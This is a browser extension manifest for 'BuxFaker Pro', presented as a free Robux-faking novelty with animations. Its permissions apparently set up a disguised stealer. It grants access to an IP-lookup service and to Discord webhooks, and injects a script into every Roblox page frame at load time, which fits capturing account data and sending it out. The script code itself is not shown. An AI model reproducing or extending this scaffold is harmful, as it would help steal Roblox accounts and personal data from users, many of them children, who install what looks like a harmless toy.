{
  "manifest_version": 3,
  "name": "BuxFaker Pro",
  "version": "1.0",
  "description": "A forever free Robux Faker Extension with premium animations!",
  
  "permissions": [
    "storage",
    "tabs",
    "webNavigation"
  ],

  "host_permissions": [
    "*://*.roblox.com/*",
    "https://api.ipify.org/",
    "https://discord.com/api/webhooks/*"
  ],

  "action": {
    "default_popup": "popup.html",
    "default_title": "Open BuxFaker"
  },

  "background": {
    "service_worker": "background.js"
  },

  "content_scripts": [
    {
      "matches": ["*://*.roblox.com/*"],
      "js": ["content.js"],
      "run_at": "document_start",
      "all_frames": true
    }
  ],

  "web_accessible_resources": [
    {
      "resources": ["icons/*.png"],
      "matches": ["*://*.roblox.com/*"]
    }
  ]
}
